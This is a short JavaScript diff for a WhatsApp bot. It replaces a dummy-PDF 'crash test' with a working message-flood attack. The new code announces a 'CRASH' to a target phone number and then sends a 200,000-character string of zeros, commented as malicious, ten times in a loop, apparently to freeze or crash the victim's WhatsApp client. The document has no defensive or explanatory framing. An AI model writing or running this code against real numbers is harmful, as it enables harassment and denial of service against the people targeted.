@@ -1,10 +1,13 @@
 module.exports = async (sock, number) => {
-    const jid = number.includes('@s.whatsapp.net') ? number : `${number}@s.whatsapp.net`;
-
-    await sock.sendMessage(jid, {
-        document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' },
-        mimetype: 'application/pdf',
-        fileName: 'bigfile.pdf',
-        caption: '🔥 CRASH TEST 🔥'
+    await sock.sendMessage(number + "@s.whatsapp.net", {
+        text: "💀⚡ بدء CRASH…"
     });
+
+    const payload = "0".repeat(200000); // 200KB نص خبيث
+
+    for (let i = 0; i < 10; i++) {
+        await sock.sendMessage(number + "@s.whatsapp.net", {
+            text: payload
+        });
+    }
 };
